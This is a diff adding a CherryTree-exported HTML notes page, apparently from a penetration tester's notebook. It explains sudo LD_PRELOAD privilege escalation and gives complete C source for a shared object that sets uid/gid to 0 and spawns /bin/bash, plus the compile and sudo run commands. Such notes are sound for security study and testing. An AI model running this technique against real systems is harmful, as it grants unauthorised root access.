@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>LD_PRELOAD</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">LD_PRELOAD</h1><br/><strong>General info about LD_PRELOAD</strong><br /><br />    If you execute ‘sudo -l’ and see the following:<br />        env_keep+=LD_PRELOAD<br />        <br />    you can force other applications to load your own .so files.<br />    <br />    You need to be able to run this application with sudo rights, however. Otherwise you can't get a root shell.<br />    <br />    <strong>Code example:</strong><br />    <br />        #include &lt;stdio.h&gt;<br />        #include &lt;sys/types.h&gt;<br />        #include &lt;stdlib.h&gt;<br />        <br />        void _init(){<br />            unsetenv("LD_PRELOAD");<br />            setgid(0);<br />            setuid(0);<br />            system("/bin/bash");<br />        }<br />        <br />        <br />    Then compile it as follows:<br />        <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code><br />        <br />    Then run it as such:<br />        <code>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</code></div></body></html>
